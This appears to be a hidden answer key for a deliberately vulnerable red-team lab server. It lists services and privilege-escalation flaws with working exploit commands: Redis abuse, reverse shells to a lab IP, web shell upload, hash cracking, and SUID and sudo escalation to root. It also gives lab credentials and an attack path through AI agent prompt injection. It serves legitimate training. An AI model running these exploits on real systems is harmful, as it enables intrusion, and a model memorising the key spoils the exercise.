# Vulnerability Reference — Services & Privilege Escalation
# THIS FILE MUST BE DELETED BY THE SETUP SCRIPT

---

## VULN-12: Redis — No Authentication, Exposed on All Interfaces

**Severity:** High
**Port:** 6379 (accessible from WireGuard network 10.10.0.0/24)
**Access:** WireGuard connection (10.10.0.10 → 10.10.0.2:6379)

**Description:**
Redis is bound to `0.0.0.0` with `protected-mode no` and no `requirepass` set.
Anyone on the WireGuard network can connect directly.

**Verification steps:**
1. From red team machine (10.10.0.10):
   ```bash
   redis-cli -h 10.10.0.2 ping
   ```
2. Expected response: `PONG`

**Exploitation — write SSH authorized_keys:**
```bash
redis-cli -h 10.10.0.2
> CONFIG SET dir /home/gary/.ssh
> CONFIG SET dbfilename authorized_keys
> SET pwn "\n\nssh-rsa AAAA...your_public_key...\n\n"
> BGSAVE
```
Then: `ssh gary@10.10.0.2`

**Exploitation — write cron job:**
```bash
redis-cli -h 10.10.0.2
> CONFIG SET dir /var/spool/cron/crontabs
> CONFIG SET dbfilename www-data
> SET cron "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.0.10/4444 0>&1'\n\n"
> BGSAVE
```

**Expected result:** SSH key written to gary's authorized_keys, or cron job written as www-data user.

---

## VULN-13: FTP Weak Credentials

**Severity:** Medium
**Port:** 21 (accessible from WireGuard network)
**Access:** WireGuard connection

**Description:**
vsftpd is running with a local user `gary`. Gary's FTP password is `grizzy2024` (same base as DB password). The FTP user is not chrooted (`chroot_local_user=NO`), so gary can navigate to any directory he has filesystem access to.

Gary's home directory is `/home/gary` and gary is in the `www-data` group, giving read access to web files.

**Verification steps:**
1. From red team machine:
   ```bash
   ftp 10.10.0.2
   # Login: gary / grizzy2024
   ```
2. Navigate to web root:
   ```
   ftp> cd /var/www/grizzy/public
   ftp> ls
   ```
3. Download config file:
   ```
   ftp> get /var/www/grizzy/config/db.php
   ```

**Expected result:** FTP login succeeds. Can read `db.php` which contains the database credentials (`grizzy2024!`).

**Further impact:** Gary also has write access to `/var/www/grizzy/public/` (gary is in the `www-data` group and the directory is group-writable). Upload a PHP web shell directly:
```
ftp> put shell.php /var/www/grizzy/public/shell.php
```
Access at `http://10.10.0.2/shell.php?cmd=id`

---

## VULN-14: MySQL — Remote Access with Application Credentials

**Severity:** Medium
**Port:** 3306 (accessible from WireGuard network)
**Access:** Credentials from .env (VULN-07) or FTP (VULN-13)

**Description:**
MySQL is bound to `0.0.0.0`. The application user `grizzy_app` is granted access from `%` (any host):
```sql
GRANT ALL PRIVILEGES ON grizzy_db.* TO 'grizzy_app'@'%'
```

**Verification steps:**
1. From red team machine:
   ```bash
   mysql -h 10.10.0.2 -u grizzy_app -p'grizzy2024!' grizzy_db
   ```
2. Dump users table:
   ```sql
   SELECT username, email, password FROM users;
   ```

**Expected result:** Direct database access. All user records including MD5 password hashes visible.

**Hash cracking:** MD5 hashes are trivially crackable. Known passwords:
- greg_grizzy: `grizzy@dmin2024` → `md5($pass)`
- gary_dev: `gary1234`
- sarah_jones: `sarah123`
- mike_t: `password1`
- emma_w: `ilovefood`

Use `hashcat -m 0` or CrackStation.net to verify.

---

## VULN-15: Privilege Escalation — World-Writable Cron Script

**Severity:** High
**Requires:** Any shell on target (e.g., www-data via RCE)

**Description:**
The file `/opt/grizzy/scripts/cleanup.sh` is set world-writable (`chmod 777`) and is executed by root every 5 minutes via:
```
*/5 * * * * root /opt/grizzy/scripts/cleanup.sh
```
in `/etc/cron.d/grizzy-cleanup` (which itself has correct cron.d permissions, but the *script* it calls is writable by anyone).

**Verification steps:**
1. As `www-data` (after RCE), check permissions:
   ```bash
   ls -la /opt/grizzy/scripts/cleanup.sh
   # -rwxrwxrwx 1 root root ... /opt/grizzy/scripts/cleanup.sh
   ```
2. Append a reverse shell:
   ```bash
   echo 'bash -i >& /dev/tcp/10.10.0.10/5555 0>&1' >> /opt/grizzy/scripts/cleanup.sh
   ```
3. Set up listener on red team machine: `nc -lvnp 5555`
4. Wait up to 5 minutes.

**Expected result:** Root shell received on listener.

**Alternative payload — add SUID bash:**
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/grizzy/scripts/cleanup.sh
```
Then: `/tmp/rootbash -p` (gives root shell)

---

## VULN-16: Privilege Escalation — SUID Binary PATH Hijacking

**Severity:** Medium
**Binary:** `/usr/local/bin/grizzbackup`
**Requires:** Any shell on target

**Description:**
`grizzbackup` is a compiled C binary with the SUID bit set (`-rwsr-xr-x root root`).
The source code (`backup.c`) calls:
```c
setuid(0);
setgid(0);
system("tar -czf /var/backups/grizzy/web_backup.tar.gz /var/www/grizzy/ 2>/dev/null");
```

`system()` resolves `tar` via the `PATH` environment variable. Since `PATH` is inherited from the caller's environment and `setuid(0)` is called *before* `system()`, the process runs as root but still uses the caller's `PATH`.

**Verification steps:**
1. As any user (e.g., `www-data`):
   ```bash
   mkdir -p /tmp/.p
   cat > /tmp/.p/tar << 'EOF'
   #!/bin/bash
   cp /bin/bash /tmp/rootbash
   chmod u+s /tmp/rootbash
   EOF
   chmod +x /tmp/.p/tar
   PATH=/tmp/.p:$PATH /usr/local/bin/grizzbackup
   /tmp/rootbash -p
   ```
2. Verify: `id` → `uid=0(root)`

**Expected result:** Root shell via malicious `tar` binary in PATH.

---

## VULN-17: Privilege Escalation — Sudo Wildcard (www-data)

**Severity:** High
**Requires:** Shell as `www-data`

**Description:**
The sudoers file contains:
```
www-data ALL=(root) NOPASSWD: /usr/bin/python3 /opt/grizzy/scripts/*.py
```

The wildcard `*` in a sudoers path does **not** match `/` (directory separator), so `/opt/grizzy/scripts/../../etc/passwd.py` would not work. However, `www-data` has write access to `/opt/grizzy/scripts/` (the directory is owned by `www-data:www-data`), so www-data can create a new `.py` file there and run it as root.

**Verification steps:**
1. As `www-data`:
   ```bash
   cat > /opt/grizzy/scripts/pwn.py << 'EOF'
   import os
   os.system('cp /bin/bash /tmp/rootbash2; chmod u+s /tmp/rootbash2')
   EOF
   sudo /usr/bin/python3 /opt/grizzy/scripts/pwn.py
   /tmp/rootbash2 -p
   id
   ```
2. Expected: `uid=0(root)`

**Note:** This requires www-data shell first (e.g., from VULN-03, VULN-04, VULN-13, or VULN-09).

---

## Account / Credential Summary

| Credential | Value | Where Used |
|---|---|---|
| DB: grizzy_app | grizzy2024! | MySQL, .env, db.php, scripts |
| FTP: gary | grizzy2024 | vsftpd port 21 |
| Internal dash: admin | grizzy@dmin123 | Flask app port 8888 |
| Website: greg_grizzy | grizzy@dmin2024 | Customer account |
| Website: gary_dev | gary1234 | Customer account |
| SSH: grizzyadmin | (key only) | Blue team access — NOT for red team |

---

## Non-Vulnerable Services (for completeness)

- **SSH (port 22):** Key-only auth, fail2ban active. Not a viable attack vector.
- **VNC (port 5901):** Strong random password, only accessible from WireGuard. Not intended as attack surface.
- **Wazuh agent:** Properly configured. Not vulnerable by design.
- **Nginx:** Version is patched. No known exploitable CVEs in the installed version.

---

## Attack Path Summary

**Easy paths:**
1. `.env` → DB credentials → MySQL → user hashes → cracked passwords → website login → IDOR
2. `info.php` → system info → fingerprinting

**Medium paths:**
3. SQLi on search → dump users table → crack hashes → password reset
4. FTP (gary/grizzy2024) → read config → MySQL access OR upload web shell → RCE → privesc
5. Redis (no auth) → write SSH key → SSH as gary → privesc

**Hard paths:**
6. AI agent prompt injection → command injection → www-data shell → sudo wildcard → root
7. Stored XSS → steal admin session cookie → use session → access internal tool → SSRF + command injection

**Privilege escalation from www-data:**
- VULN-15 (cron world-writable script) — wait-based, reliable
- VULN-16 (SUID PATH hijack) — immediate
- VULN-17 (sudo wildcard) — immediate, requires write to /opt/grizzy/scripts/

---

## File Locations on Target Machine

| File | Path |
|---|---|
| Web root | `/var/www/grizzy/public/` |
| DB config | `/var/www/grizzy/config/db.php` |
| .env | `/var/www/grizzy/public/.env` |
| phpinfo | `/var/www/grizzy/public/info.php` |
| Uploads | `/var/www/grizzy/public/uploads/` |
| Agent script | `/opt/grizzy/scripts/get_order.py` |
| DB query script | `/opt/grizzy/scripts/db_query.sh` |
| Cleanup script | `/opt/grizzy/scripts/cleanup.sh` (world-writable) |
| Export script | `/opt/grizzy/scripts/export_orders.py` |
| SUID binary | `/usr/local/bin/grizzbackup` |
| Internal app | `/opt/grizzy/internal/app.py` |
| Cron file | `/etc/cron.d/grizzy-cleanup` |
| Wazuh agent config | `/var/ossec/etc/ossec.conf` |
